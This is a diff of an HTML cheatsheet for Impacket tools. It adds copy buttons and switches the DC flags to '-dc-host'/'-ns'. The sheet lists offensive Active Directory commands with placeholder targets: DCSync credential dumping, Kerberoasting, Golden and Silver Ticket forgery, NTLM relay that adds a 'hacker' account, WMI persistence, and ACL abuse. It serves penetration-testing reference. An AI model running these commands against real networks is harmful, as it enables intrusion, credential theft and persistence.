@@ -24,392 +24,376 @@
   h2 { color: #f0883e; font-size: 11px; text-transform: uppercase; letter-spacing: 2px; margin: 26px 0 8px; border-bottom: 1px solid #21262d; padding-bottom: 5px; }
 
   table { width: 100%; border-collapse: collapse; }
-  tr { cursor: pointer; }
+  tr { cursor: default; }
   tr:hover td { background: #161b22; }
   tr.copied td { background: #0d2b1a !important; }
   td { padding: 5px 10px 5px 0; vertical-align: top; border-bottom: 1px solid #161b22; transition: background 0.15s; }
   td.tool { color: #79c0ff; width: 260px; white-space: nowrap; padding-right: 20px; }
   td.cmd  { color: #e3b341; white-space: pre-wrap; word-break: break-all; }
   td.desc { color: #6e7681; font-size: 11px; width: 220px; padding-left: 16px; }
+  .copy-btn { background: transparent; border: 1px solid #30363d; color: #6e7681; font-family: 'IBM Plex Mono', monospace; font-size: 10px; padding: 2px 8px; border-radius: 3px; cursor: pointer; white-space: nowrap; transition: all 0.15s; }
+  .copy-btn:hover { border-color: #58a6ff; color: #58a6ff; }
+  .copy-btn:active { background: #0d2b1a; border-color: #2ea043; color: #3fb950; }
+  td.copy-cell { width: 54px; padding: 4px 8px 4px 0; vertical-align: middle; }
 
   .tab { display: none; }
   .tab.active { display: block; }
 
-  /* ── Copied tooltip ── */
-  #toast {
-    position: fixed;
-    top: 50%;
-    left: 50%;
-    transform: translate(-50%, -50%) scale(0.85);
-    background: #1a2f1a;
-    border: 1px solid #2ea043;
-    color: #3fb950;
-    font-family: 'IBM Plex Mono', monospace;
-    font-size: 13px;
-    padding: 12px 28px;
-    border-radius: 6px;
-    pointer-events: none;
-    opacity: 0;
-    transition: opacity 0.12s ease, transform 0.12s ease;
-    z-index: 9999;
-    white-space: nowrap;
-  }
-  #toast.show {
-    opacity: 1;
-    transform: translate(-50%, -50%) scale(1);
-  }
-  #toast-cmd {
-    display: block;
-    color: #8b949e;
-    font-size: 10px;
-    margin-top: 4px;
-    max-width: 480px;
-    overflow: hidden;
-    text-overflow: ellipsis;
-    white-space: nowrap;
-  }
+  #toast { position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%) scale(0.85); background: #1a2f1a; border: 1px solid #2ea043; color: #3fb950; font-family: 'IBM Plex Mono', monospace; font-size: 13px; padding: 12px 28px; border-radius: 6px; pointer-events: none; opacity: 0; transition: opacity 0.12s ease, transform 0.12s ease; z-index: 9999; white-space: nowrap; }
+  #toast.show { opacity: 1; transform: translate(-50%, -50%) scale(1); }
+  #toast-cmd { display: block; color: #8b949e; font-size: 10px; margin-top: 4px; max-width: 480px; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; }
 </style>
 </head>
 <body>
 
-<div id="toast">✓ Copied!<span id="toast-cmd"></span></div>
+<div id="toast">&#10003; Copied!<span id="toast-cmd"></span></div>
 
 <header>
   <h1>Impacket Cheatsheet</h1>
   <div class="toggle-wrap">
-    <button class="toggle-btn active" onclick="setTab('kali')">🐉 Kali Linux</button>
-    <button class="toggle-btn" onclick="setTab('py')">🐍 Python (repo)</button>
+    <button class="toggle-btn active" onclick="setTab('kali', this)">&#x1F409; Kali Linux</button>
+    <button class="toggle-btn" onclick="setTab('py', this)">&#x1F40D; Python (repo)</button>
   </div>
 </header>
-<div class="subtitle">Click any row to copy the full command to clipboard</div>
+<div class="subtitle">Click <b>copy</b> on any row to copy the full command &nbsp;|&nbsp; Commands use <b>-dc-host</b> and <b>-ns</b> throughout</div>
 
 <div class="note">
   <b>Auth flags (work on most tools):</b><br>
   Password:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <b>DOMAIN/user:Pass@target</b><br>
   Pass-the-Hash: <b>-hashes :NTHASH</b> &nbsp;(or LM:NT)<br>
-  Kerberos:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <b>-k -no-pass</b> &nbsp;— set <b>export KRB5CCNAME=/path/to/ticket.ccache</b> first<br>
-  AES key:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <b>-aesKey HEX</b> &nbsp;|&nbsp; DC: <b>-dc-ip 192.168.1.1</b>
+  Kerberos:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <b>-k -no-pass</b> &nbsp;&#8212; set <b>export KRB5CCNAME=/path/to/ticket.ccache</b> first<br>
+  AES key:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <b>-aesKey HEX</b> &nbsp;|&nbsp; DC: <b>-dc-host dc01.domain.local -ns dc01.domain.local</b>
 </div>
 
-
-<!-- ══════════════ KALI TAB ══════════════ -->
 <div id="tab-kali" class="tab active">
 
 <h2>Remote Execution</h2>
 <table>
-  <tr><td class="tool">impacket-psexec</td><td class="cmd">DOMAIN/user:Pass@192.168.1.10</td><td class="desc">SYSTEM shell via SVCManager</td></tr>
-  <tr><td class="tool">impacket-wmiexec</td><td class="cmd">DOMAIN/user:Pass@192.168.1.10</td><td class="desc">Shell via WMI, no binary drop</td></tr>
-  <tr><td class="tool">impacket-smbexec</td><td class="cmd">DOMAIN/user:Pass@192.168.1.10</td><td class="desc">Shell via temp service, no upload</td></tr>
-  <tr><td class="tool">impacket-atexec</td><td class="cmd">DOMAIN/user:Pass@192.168.1.10 "whoami"</td><td class="desc">Execute via Task Scheduler</td></tr>
-  <tr><td class="tool">impacket-dcomexec</td><td class="cmd">DOMAIN/user:Pass@192.168.1.10</td><td class="desc">Shell via DCOM objects</td></tr>
+  <tr><td class="tool">impacket-psexec</td><td class="cmd">DOMAIN/user:Pass@192.168.1.10</td><td class="desc">SYSTEM shell via SVCManager</td><td class="copy-cell"><button class="copy-btn" onclick="copyRow(this)">copy</button></td></tr>
+  <tr><td class="tool">impacket-wmiexec</td><td class="cmd">DOMAIN/user:Pass@192.168.1.10</td><td class="desc">Shell via WMI, no binary drop</td><td class="copy-cell"><button class="copy-btn" onclick="copyRow(this)">copy</button></td></tr>
+  <tr><td class="tool">impacket-smbexec</td><td class="cmd">DOMAIN/user:Pass@192.168.1.10</td><td class="desc">Shell via temp service, no upload</td><td class="copy-cell"><button class="copy-btn" onclick="copyRow(this)">copy</button></td></tr>
+  <tr><td class="tool">impacket-atexec</td><td class="cmd">DOMAIN/user:Pass@192.168.1.10 "whoami"</td><td class="desc">Execute via Task Scheduler</td><td class="copy-cell"><button class="copy-btn" onclick="copyRow(this)">copy</button></td></tr>
+  <tr><td class="tool">impacket-dcomexec</td><td class="cmd">DOMAIN/user:Pass@192.168.1.10</td><td class="desc">Shell via DCOM objects</td><td class="copy-cell"><button class="copy-btn" onclick="copyRow(this)">copy</button></td></tr>
 </table>
 
 <h2>Kerberos Attacks</h2>
 <table>
-  <tr><td class="tool">impacket-GetUserSPNs</td><td class="cmd">domain.local/user:Pass -dc-ip 192.168.1.1 -request -outputfile tgs.hash</td><td class="desc">Kerberoasting (hashcat -m 13100)</td></tr>
-  <tr><td class="tool">impacket-GetNPUsers</td><td class="cmd">domain.local/ -usersfile users.txt -format hashcat -outputfile asrep.hash -dc-ip 192.168.1.1</td><td class="desc">AS-REP Roast (hashcat -m 18200)</td></tr>
-  <tr><td class="tool">impacket-getTGT</td><td class="cmd">domain.local/user:Pass</td><td class="desc">Request TGT → saves .ccache</td></tr>
-  <tr><td class="tool">impacket-getTGT</td><td class="cmd">domain.local/user -hashes :NTHASH</td><td class="desc">Overpass-the-Hash / PTK</td></tr>
-  <tr><td class="tool">impacket-getST</td><td class="cmd">-spn cifs/target.domain.local -impersonate Administrator domain.local/svc:Pass</td><td class="desc">S4U2self / delegation abuse</td></tr>
-  <tr><td class="tool">impacket-getPac</td><td class="cmd">-targetUser Administrator domain.local/user:Pass</td><td class="desc">Retrieve PAC of target user</td></tr>
-  <tr><td class="tool">impacket-ticketer</td><td class="cmd">-nthash KRBTGT_HASH -domain-sid S-1-5-21-... -domain domain.local Administrator</td><td class="desc">Forge Golden Ticket (TGT)</td></tr>
-  <tr><td class="tool">impacket-ticketer</td><td class="cmd">-nthash SVC_HASH -domain-sid S-1-5-21-... -domain domain.local -spn cifs/target Administrator</td><td class="desc">Forge Silver Ticket (TGS)</td></tr>
-  <tr><td class="tool">impacket-ticketConverter</td><td class="cmd">ticket.kirbi ticket.ccache</td><td class="desc">kirbi (Mimikatz) ↔ ccache</td></tr>
-  <tr><td class="tool">impacket-describeTicket</td><td class="cmd">ticket.ccache</td><td class="desc">Parse and describe a Kerberos ticket</td></tr>
-  <tr><td class="tool">impacket-raiseChild</td><td class="cmd">-target-exec 192.168.1.10 domain.local/childadmin:Pass</td><td class="desc">Child domain → forest DA privesc</td></tr>
-  <tr><td class="tool">impacket-keylistattack</td><td class="cmd">-rodcNo 502 -rodcKey KEY domain.local/user:Pass@dc01</td><td class="desc">RODC KERB-KEY-LIST-REQ dump</td></tr>
+  <tr><td class="tool">impacket-GetUserSPNs</td><td class="cmd">domain.local/user:Pass -dc-host 192.168.1.1 -ns 192.168.1.1 -request -outputfile tgs.hash</td><td class="desc">Kerberoasting (hashcat -m 13100)</td><td class="copy-cell"><button class="copy-btn" onclick="copyRow(this)">copy</button></td></tr>
+  <tr><td class="tool">impacket-GetNPUsers</td><td class="cmd">domain.local/ -usersfile users.txt -format hashcat -outputfile asrep.hash -dc-host 192.168.1.1 -ns 192.168.1.1</td><td class="desc">AS-REP Roast (hashcat -m 18200)</td><td class="copy-cell"><button class="copy-btn" onclick="copyRow(this)">copy</button></td></tr>
+  <tr><td class="tool">impacket-getTGT</td><td class="cmd">domain.local/user:Pass</td><td class="desc">Request TGT → saves .ccache</td><td class="copy-cell"><button class="copy-btn" onclick="copyRow(this)">copy</button></td></tr>
+  <tr><td class="tool">impacket-getTGT</td><td class="cmd">domain.local/user -hashes :NTHASH</td><td class="desc">Overpass-the-Hash / PTK</td><td class="copy-cell"><button class="copy-btn" onclick="copyRow(this)">copy</button></td></tr>
+  <tr><td class="tool">impacket-getST</td><td class="cmd">-spn cifs/target.domain.local -impersonate Administrator domain.local/svc:Pass</td><td class="desc">S4U2self / delegation abuse</td><td class="copy-cell"><button class="copy-btn" onclick="copyRow(this)">copy</button></td></tr>
+  <tr><td class="tool">impacket-getPac</td><td class="cmd">-targetUser Administrator domain.local/user:Pass</td><td class="desc">Retrieve PAC of target user</td><td class="copy-cell"><button class="copy-btn" onclick="copyRow(this)">copy</button></td></tr>
+  <tr><td class="tool">impacket-ticketer</td><td class="cmd">-nthash KRBTGT_HASH -domain-sid S-1-5-21-... -domain domain.local Administrator</td><td class="desc">Forge Golden Ticket (TGT)</td><td class="copy-cell"><button class="copy-btn" onclick="copyRow(this)">copy</button></td></tr>
+  <tr><td class="tool">impacket-ticketer</td><td class="cmd">-nthash SVC_HASH -domain-sid S-1-5-21-... -domain domain.local -spn cifs/target Administrator</td><td class="desc">Forge Silver Ticket (TGS)</td><td class="copy-cell"><button class="copy-btn" onclick="copyRow(this)">copy</button></td></tr>
+  <tr><td class="tool">impacket-ticketConverter</td><td class="cmd">ticket.kirbi ticket.ccache</td><td class="desc">kirbi (Mimikatz) ↔ ccache</td><td class="copy-cell"><button class="copy-btn" onclick="copyRow(this)">copy</button></td></tr>
+  <tr><td class="tool">impacket-describeTicket</td><td class="cmd">ticket.ccache</td><td class="desc">Parse and describe a Kerberos ticket</td><td class="copy-cell"><button class="copy-btn" onclick="copyRow(this)">copy</button></td></tr>
+  <tr><td class="tool">impacket-raiseChild</td><td class="cmd">-target-exec 192.168.1.10 domain.local/childadmin:Pass</td><td class="desc">Child domain → forest DA privesc</td><td class="copy-cell"><button class="copy-btn" onclick="copyRow(this)">copy</button></td></tr>
+  <tr><td class="tool">impacket-keylistattack</td><td class="cmd">-rodcNo 502 -rodcKey KEY domain.local/user:Pass@dc01</td><td class="desc">RODC KERB-KEY-LIST-REQ dump</td><td class="copy-cell"><button class="copy-btn" onclick="copyRow(this)">copy</button></td></tr>
 </table>
 
 <h2>Credential Dumping</h2>
 <table>
-  <tr><td class="tool">impacket-secretsdump</td><td class="cmd">DOMAIN/Admin:Pass@192.168.1.1</td><td class="desc">DCSync — dump all hashes from DC</td></tr>
-  <tr><td class="tool">impacket-secretsdump</td><td class="cmd">DOMAIN/Admin:Pass@192.168.1.1 -just-dc-user krbtgt</td><td class="desc">DCSync single user</td></tr>
-  <tr><td class="tool">impacket-secretsdump</td><td class="cmd">-sam SAM -system SYSTEM -security SECURITY local</td><td class="desc">Offline SAM/LSA from reg hives</td></tr>
-  <tr><td class="tool">impacket-secretsdump</td><td class="cmd">-ntds ntds.dit -system SYSTEM local</td><td class="desc">Offline NTDS.dit dump</td></tr>
-  <tr><td class="tool">impacket-DumpNTLMInfo</td><td class="cmd">192.168.1.10</td><td class="desc">NTLM info probe — no auth needed</td></tr>
-  <tr><td class="tool">impacket-dpapi</td><td class="cmd">masterkey -file key.pvk -sid S-1-5-21-... -password Pass</td><td class="desc">Decrypt DPAPI masterkeys/blobs</td></tr>
-  <tr><td class="tool">impacket-mimikatz</td><td class="cmd">DOMAIN/user:Pass@192.168.1.10</td><td class="desc">Remote Mimikatz-like RPC interface</td></tr>
+  <tr><td class="tool">impacket-secretsdump</td><td class="cmd">DOMAIN/Admin:Pass@192.168.1.1</td><td class="desc">DCSync — dump all hashes from DC</td><td class="copy-cell"><button class="copy-btn" onclick="copyRow(this)">copy</button></td></tr>
+  <tr><td class="tool">impacket-secretsdump</td><td class="cmd">DOMAIN/Admin:Pass@192.168.1.1 -just-dc-user krbtgt</td><td class="desc">DCSync single user</td><td class="copy-cell"><button class="copy-btn" onclick="copyRow(this)">copy</button></td></tr>
+  <tr><td class="tool">impacket-secretsdump</td><td class="cmd">-sam SAM -system SYSTEM -security SECURITY local</td><td class="desc">Offline SAM/LSA from reg hives</td><td class="copy-cell"><button class="copy-btn" onclick="copyRow(this)">copy</button></td></tr>
+  <tr><td class="tool">impacket-secretsdump</td><td class="cmd">-ntds ntds.dit -system SYSTEM local</td><td class="desc">Offline NTDS.dit dump</td><td class="copy-cell"><button class="copy-btn" onclick="copyRow(this)">copy</button></td></tr>
+  <tr><td class="tool">impacket-DumpNTLMInfo</td><td class="cmd">192.168.1.10</td><td class="desc">NTLM info probe — no auth needed</td><td class="copy-cell"><button class="copy-btn" onclick="copyRow(this)">copy</button></td></tr>
+  <tr><td class="tool">impacket-dpapi</td><td class="cmd">masterkey -file key.pvk -sid S-1-5-21-... -password Pass</td><td class="desc">Decrypt DPAPI masterkeys/blobs</td><td class="copy-cell"><button class="copy-btn" onclick="copyRow(this)">copy</button></td></tr>
+  <tr><td class="tool">impacket-mimikatz</td><td class="cmd">DOMAIN/user:Pass@192.168.1.10</td><td class="desc">Remote Mimikatz-like RPC interface</td><td class="copy-cell"><button class="copy-btn" onclick="copyRow(this)">copy</button></td></tr>
 </table>
 
 <h2>SMB &amp; File Operations</h2>
 <table>
-  <tr><td class="tool">impacket-smbclient</td><td class="cmd">DOMAIN/user:Pass@192.168.1.10</td><td class="desc">Interactive SMB shell (shares, get, put)</td></tr>
-  <tr><td class="tool">impacket-smbserver</td><td class="cmd">share . -smb2support</td><td class="desc">Host current dir as SMB share</td></tr>
-  <tr><td class="tool">impacket-smbserver</td><td class="cmd">share /opt/files -smb2support -username u -password p</td><td class="desc">Authenticated share</td></tr>
-  <tr><td class="tool">impacket-karmaSMB</td><td class="cmd">/path/to/file.exe -smb2support</td><td class="desc">Serve arbitrary file for any UNC path</td></tr>
+  <tr><td class="tool">impacket-smbclient</td><td class="cmd">DOMAIN/user:Pass@192.168.1.10</td><td class="desc">Interactive SMB shell (shares, get, put)</td><td class="copy-cell"><button class="copy-btn" onclick="copyRow(this)">copy</button></td></tr>
+  <tr><td class="tool">impacket-smbserver</td><td class="cmd">share . -smb2support</td><td class="desc">Host current dir as SMB share</td><td class="copy-cell"><button class="copy-btn" onclick="copyRow(this)">copy</button></td></tr>
+  <tr><td class="tool">impacket-smbserver</td><td class="cmd">share /opt/files -smb2support -username u -password p</td><td class="desc">Authenticated share</td><td class="copy-cell"><button class="copy-btn" onclick="copyRow(this)">copy</button></td></tr>
+  <tr><td class="tool">impacket-karmaSMB</td><td class="cmd">/path/to/file.exe -smb2support</td><td class="desc">Serve arbitrary file for any UNC path</td><td class="copy-cell"><button class="copy-btn" onclick="copyRow(this)">copy</button></td></tr>
 </table>
 
 <h2>AD Enumeration</h2>
 <table>
-  <tr><td class="tool">impacket-GetADUsers</td><td class="cmd">domain.local/user:Pass -dc-ip 192.168.1.1 -all</td><td class="desc">Enumerate all domain users</td></tr>
-  <tr><td class="tool">impacket-GetADComputers</td><td class="cmd">domain.local/user:Pass -dc-ip 192.168.1.1 -resolveIP</td><td class="desc">Enumerate domain computers</td></tr>
-  <tr><td class="tool">impacket-GetLAPSPassword</td><td class="cmd">domain.local/user:Pass -dc-ip 192.168.1.1</td><td class="desc">Dump LAPS passwords via LDAP</td></tr>
-  <tr><td class="tool">impacket-lookupsid</td><td class="cmd">DOMAIN/user:Pass@192.168.1.10</td><td class="desc">SID brute-force — enumerate users</td></tr>
-  <tr><td class="tool">impacket-samrdump</td><td class="cmd">DOMAIN/user:Pass@192.168.1.10</td><td class="desc">Enumerate users/shares via SAMR</td></tr>
-  <tr><td class="tool">impacket-netview</td><td class="cmd">domain.local/user:Pass -targets hosts.txt</td><td class="desc">Track active sessions across hosts</td></tr>
-  <tr><td class="tool">impacket-findDelegation</td><td class="cmd">domain.local/user:Pass -dc-ip 192.168.1.1</td><td class="desc">List all delegation relationships</td></tr>
-  <tr><td class="tool">impacket-Get-GPPPassword</td><td class="cmd">DOMAIN/user:Pass@192.168.1.10</td><td class="desc">Extract/decrypt GPP passwords</td></tr>
-  <tr><td class="tool">impacket-machine_role</td><td class="cmd">DOMAIN/user:Pass@192.168.1.10</td><td class="desc">Get machine role (DC, member, etc.)</td></tr>
+  <tr><td class="tool">impacket-GetADUsers</td><td class="cmd">domain.local/user:Pass -dc-host 192.168.1.1 -ns 192.168.1.1 -all</td><td class="desc">Enumerate all domain users</td><td class="copy-cell"><button class="copy-btn" onclick="copyRow(this)">copy</button></td></tr>
+  <tr><td class="tool">impacket-GetADComputers</td><td class="cmd">domain.local/user:Pass -dc-host 192.168.1.1 -ns 192.168.1.1 -resolveIP</td><td class="desc">Enumerate domain computers</td><td class="copy-cell"><button class="copy-btn" onclick="copyRow(this)">copy</button></td></tr>
+  <tr><td class="tool">impacket-GetLAPSPassword</td><td class="cmd">domain.local/user:Pass -dc-host 192.168.1.1 -ns 192.168.1.1</td><td class="desc">Dump LAPS passwords via LDAP</td><td class="copy-cell"><button class="copy-btn" onclick="copyRow(this)">copy</button></td></tr>
+  <tr><td class="tool">impacket-lookupsid</td><td class="cmd">DOMAIN/user:Pass@192.168.1.10</td><td class="desc">SID brute-force — enumerate users</td><td class="copy-cell"><button class="copy-btn" onclick="copyRow(this)">copy</button></td></tr>
+  <tr><td class="tool">impacket-samrdump</td><td class="cmd">DOMAIN/user:Pass@192.168.1.10</td><td class="desc">Enumerate users/shares via SAMR</td><td class="copy-cell"><button class="copy-btn" onclick="copyRow(this)">copy</button></td></tr>
+  <tr><td class="tool">impacket-netview</td><td class="cmd">domain.local/user:Pass -targets hosts.txt</td><td class="desc">Track active sessions across hosts</td><td class="copy-cell"><button class="copy-btn" onclick="copyRow(this)">copy</button></td></tr>
+  <tr><td class="tool">impacket-findDelegation</td><td class="cmd">domain.local/user:Pass -dc-host 192.168.1.1 -ns 192.168.1.1</td><td class="desc">List all delegation relationships</td><td class="copy-cell"><button class="copy-btn" onclick="copyRow(this)">copy</button></td></tr>
+  <tr><td class="tool">impacket-Get-GPPPassword</td><td class="cmd">DOMAIN/user:Pass@192.168.1.10</td><td class="desc">Extract/decrypt GPP passwords</td><td class="copy-cell"><button class="copy-btn" onclick="copyRow(this)">copy</button></td></tr>
+  <tr><td class="tool">impacket-machine_role</td><td class="cmd">DOMAIN/user:Pass@192.168.1.10</td><td class="desc">Get machine role (DC, member, etc.)</td><td class="copy-cell"><button class="copy-btn" onclick="copyRow(this)">copy</button></td></tr>
 </table>
 
 <h2>NTLM Relay</h2>
 <table>
-  <tr><td class="tool">impacket-ntlmrelayx</td><td class="cmd">-tf targets.txt -smb2support</td><td class="desc">Relay to targets — auto SAM dump</td></tr>
-  <tr><td class="tool">impacket-ntlmrelayx</td><td class="cmd">-tf targets.txt -smb2support -c "net user hacker P@ss /add"</td><td class="desc">Relay + execute command</td></tr>
-  <tr><td class="tool">impacket-ntlmrelayx</td><td class="cmd">-tf targets.txt -smb2support -socks</td><td class="desc">Relay into SOCKS sessions</td></tr>
-  <tr><td class="tool">impacket-ntlmrelayx</td><td class="cmd">-t ldap://192.168.1.1 -smb2support</td><td class="desc">Relay to LDAP</td></tr>
+  <tr><td class="tool">impacket-ntlmrelayx</td><td class="cmd">-tf targets.txt -smb2support</td><td class="desc">Relay to targets — auto SAM dump</td><td class="copy-cell"><button class="copy-btn" onclick="copyRow(this)">copy</button></td></tr>
+  <tr><td class="tool">impacket-ntlmrelayx</td><td class="cmd">-tf targets.txt -smb2support -c "net user hacker P@ss /add"</td><td class="desc">Relay + execute command</td><td class="copy-cell"><button class="copy-btn" onclick="copyRow(this)">copy</button></td></tr>
+  <tr><td class="tool">impacket-ntlmrelayx</td><td class="cmd">-tf targets.txt -smb2support -socks</td><td class="desc">Relay into SOCKS sessions</td><td class="copy-cell"><button class="copy-btn" onclick="copyRow(this)">copy</button></td></tr>
+  <tr><td class="tool">impacket-ntlmrelayx</td><td class="cmd">-t ldap://192.168.1.1 -smb2support</td><td class="desc">Relay to LDAP</td><td class="copy-cell"><button class="copy-btn" onclick="copyRow(this)">copy</button></td></tr>
 </table>
 
 <h2>ACL / Ownership Abuse</h2>
 <table>
-  <tr><td class="tool">impacket-dacledit</td><td class="cmd">-action read -target targetuser DOMAIN/user:Pass -dc-ip 192.168.1.1</td><td class="desc">Read DACLs on AD object</td></tr>
-  <tr><td class="tool">impacket-dacledit</td><td class="cmd">-action write -rights FullControl -principal attacker -target victim DOMAIN/Admin:Pass -dc-ip 192.168.1.1</td><td class="desc">Grant FullControl on AD object</td></tr>
-  <tr><td class="tool">impacket-owneredit</td><td class="cmd">-action write -new-owner attacker -target victim DOMAIN/Admin:Pass -dc-ip 192.168.1.1</td><td class="desc">Change owner of AD object</td></tr>
-  <tr><td class="tool">impacket-rbcd</td><td class="cmd">-action write -delegate-to target$ -delegate-from evil$ DOMAIN/Admin:Pass -dc-ip 192.168.1.1</td><td class="desc">Write msDS-AllowedToActOnBehalfOf</td></tr>
+  <tr><td class="tool">impacket-dacledit</td><td class="cmd">-action read -target targetuser DOMAIN/user:Pass -dc-host 192.168.1.1 -ns 192.168.1.1</td><td class="desc">Read DACLs on AD object</td><td class="copy-cell"><button class="copy-btn" onclick="copyRow(this)">copy</button></td></tr>
+  <tr><td class="tool">impacket-dacledit</td><td class="cmd">-action write -rights FullControl -principal attacker -target victim DOMAIN/Admin:Pass -dc-host 192.168.1.1 -ns 192.168.1.1</td><td class="desc">Grant FullControl on AD object</td><td class="copy-cell"><button class="copy-btn" onclick="copyRow(this)">copy</button></td></tr>
+  <tr><td class="tool">impacket-owneredit</td><td class="cmd">-action write -new-owner attacker -target victim DOMAIN/Admin:Pass -dc-host 192.168.1.1 -ns 192.168.1.1</td><td class="desc">Change owner of AD object</td><td class="copy-cell"><button class="copy-btn" onclick="copyRow(this)">copy</button></td></tr>
+  <tr><td class="tool">impacket-rbcd</td><td class="cmd">-action write -delegate-to target$ -delegate-from evil$ DOMAIN/Admin:Pass -dc-host 192.168.1.1 -ns 192.168.1.1</td><td class="desc">Write msDS-AllowedToActOnBehalfOf</td><td class="copy-cell"><button class="copy-btn" onclick="copyRow(this)">copy</button></td></tr>
 </table>
 
 <h2>MSSQL</h2>
 <table>
-  <tr><td class="tool">impacket-mssqlclient</td><td class="cmd">DOMAIN/user:Pass@192.168.1.10 -windows-auth</td><td class="desc">Windows auth (enable_xp_cmdshell for RCE)</td></tr>
-  <tr><td class="tool">impacket-mssqlclient</td><td class="cmd">sa:Pass@192.168.1.10</td><td class="desc">SQL auth login</td></tr>
-  <tr><td class="tool">impacket-mssqlinstance</td><td class="cmd">192.168.1.10</td><td class="desc">Discover MSSQL instance names</td></tr>
+  <tr><td class="tool">impacket-mssqlclient</td><td class="cmd">DOMAIN/user:Pass@192.168.1.10 -windows-auth</td><td class="desc">Windows auth (enable_xp_cmdshell for RCE)</td><td class="copy-cell"><button class="copy-btn" onclick="copyRow(this)">copy</button></td></tr>
+  <tr><td class="tool">impacket-mssqlclient</td><td class="cmd">sa:Pass@192.168.1.10</td><td class="desc">SQL auth login</td><td class="copy-cell"><button class="copy-btn" onclick="copyRow(this)">copy</button></td></tr>
+  <tr><td class="tool">impacket-mssqlinstance</td><td class="cmd">192.168.1.10</td><td class="desc">Discover MSSQL instance names</td><td class="copy-cell"><button class="copy-btn" onclick="copyRow(this)">copy</button></td></tr>
 </table>
 
 <h2>MSRPC / Registry / Services</h2>
 <table>
-  <tr><td class="tool">impacket-services</td><td class="cmd">DOMAIN/user:Pass@192.168.1.10 list</td><td class="desc">List all Windows services</td></tr>
-  <tr><td class="tool">impacket-services</td><td class="cmd">DOMAIN/user:Pass@192.168.1.10 start -name Spooler</td><td class="desc">start / stop / status / delete service</td></tr>
-  <tr><td class="tool">impacket-reg</td><td class="cmd">DOMAIN/user:Pass@192.168.1.10 query -keyName "HKLM\SOFTWARE\..." -v ProductName</td><td class="desc">Remote registry read/write/delete</td></tr>
-  <tr><td class="tool">impacket-rpcdump</td><td class="cmd">192.168.1.10</td><td class="desc">Dump all RPC endpoints</td></tr>
-  <tr><td class="tool">impacket-rpcmap</td><td class="cmd">ncacn_ip_tcp:192.168.1.10</td><td class="desc">Scan for listening DCE/RPC interfaces</td></tr>
-  <tr><td class="tool">impacket-wmiquery</td><td class="cmd">DOMAIN/user:Pass@192.168.1.10 -query "SELECT * FROM Win32_Process"</td><td class="desc">Run WQL query via WMI</td></tr>
-  <tr><td class="tool">impacket-wmipersist</td><td class="cmd">DOMAIN/user:Pass@192.168.1.10 install -name evil -filter "SELECT * FROM __InstanceModificationEvent" -vbscript script.vbs</td><td class="desc">WMI event subscription persistence</td></tr>
-  <tr><td class="tool">impacket-tstool</td><td class="cmd">DOMAIN/user:Pass@192.168.1.10 -cmd list</td><td class="desc">Terminal Services / RDP session mgmt</td></tr>
+  <tr><td class="tool">impacket-services</td><td class="cmd">DOMAIN/user:Pass@192.168.1.10 list</td><td class="desc">List all Windows services</td><td class="copy-cell"><button class="copy-btn" onclick="copyRow(this)">copy</button></td></tr>
+  <tr><td class="tool">impacket-services</td><td class="cmd">DOMAIN/user:Pass@192.168.1.10 start -name Spooler</td><td class="desc">start / stop / status / delete service</td><td class="copy-cell"><button class="copy-btn" onclick="copyRow(this)">copy</button></td></tr>
+  <tr><td class="tool">impacket-reg</td><td class="cmd">DOMAIN/user:Pass@192.168.1.10 query -keyName "HKLM\SOFTWARE\..." -v ProductName</td><td class="desc">Remote registry read/write/delete</td><td class="copy-cell"><button class="copy-btn" onclick="copyRow(this)">copy</button></td></tr>
+  <tr><td class="tool">impacket-rpcdump</td><td class="cmd">192.168.1.10</td><td class="desc">Dump all RPC endpoints</td><td class="copy-cell"><button class="copy-btn" onclick="copyRow(this)">copy</button></td></tr>
+  <tr><td class="tool">impacket-rpcmap</td><td class="cmd">ncacn_ip_tcp:192.168.1.10</td><td class="desc">Scan for listening DCE/RPC interfaces</td><td class="copy-cell"><button class="copy-btn" onclick="copyRow(this)">copy</button></td></tr>
+  <tr><td class="tool">impacket-wmiquery</td><td class="cmd">DOMAIN/user:Pass@192.168.1.10 -query "SELECT * FROM Win32_Process"</td><td class="desc">Run WQL query via WMI</td><td class="copy-cell"><button class="copy-btn" onclick="copyRow(this)">copy</button></td></tr>
+  <tr><td class="tool">impacket-wmipersist</td><td class="cmd">DOMAIN/user:Pass@192.168.1.10 install -name evil -filter "SELECT * FROM __InstanceModificationEvent" -vbscript script.vbs</td><td class="desc">WMI event subscription persistence</td><td class="copy-cell"><button class="copy-btn" onclick="copyRow(this)">copy</button></td></tr>
+  <tr><td class="tool">impacket-tstool</td><td class="cmd">DOMAIN/user:Pass@192.168.1.10 -cmd list</td><td class="desc">Terminal Services / RDP session mgmt</td><td class="copy-cell"><button class="copy-btn" onclick="copyRow(this)">copy</button></td></tr>
 </table>
 
 <h2>AD Computer / Password</h2>
 <table>
-  <tr><td class="tool">impacket-addcomputer</td><td class="cmd">domain.local/user:Pass -dc-ip 192.168.1.1 -computer-name EVIL$ -computer-pass P@ss1</td><td class="desc">Add machine account to domain</td></tr>
-  <tr><td class="tool">impacket-changepasswd</td><td class="cmd">DOMAIN/user:OldPass@192.168.1.10 -newpass NewPass1!</td><td class="desc">Change/reset password (multi-protocol)</td></tr>
-  <tr><td class="tool">impacket-net</td><td class="cmd">DOMAIN/user:Pass@192.168.1.10 user -list</td><td class="desc">Remote net.exe equivalent</td></tr>
-  <tr><td class="tool">impacket-getArch</td><td class="cmd">-target 192.168.1.10</td><td class="desc">Detect remote OS architecture</td></tr>
+  <tr><td class="tool">impacket-addcomputer</td><td class="cmd">domain.local/user:Pass -dc-host 192.168.1.1 -ns 192.168.1.1 -computer-name EVIL$ -computer-pass P@ss1</td><td class="desc">Add machine account to domain</td><td class="copy-cell"><button class="copy-btn" onclick="copyRow(this)">copy</button></td></tr>
+  <tr><td class="tool">impacket-changepasswd</td><td class="cmd">DOMAIN/user:OldPass@192.168.1.10 -newpass NewPass1!</td><td class="desc">Change/reset password (multi-protocol)</td><td class="copy-cell"><button class="copy-btn" onclick="copyRow(this)">copy</button></td></tr>
